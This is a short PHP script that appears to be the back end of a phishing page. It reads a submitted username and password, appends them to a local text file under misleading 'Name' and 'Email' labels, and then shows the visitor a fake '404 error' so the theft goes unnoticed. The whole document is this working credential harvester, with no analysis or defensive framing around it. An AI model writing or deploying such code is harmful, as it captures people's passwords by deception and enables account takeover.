<?php
$username = $_POST["username"];
$password = $_POST["password"];
$file = fopen("data.txt", "a");
fwrite($file, "Name: " . $username . "\n");
fwrite($file, "Email: " . $password . "\n");
fclose($file);
echo "404 error";
?>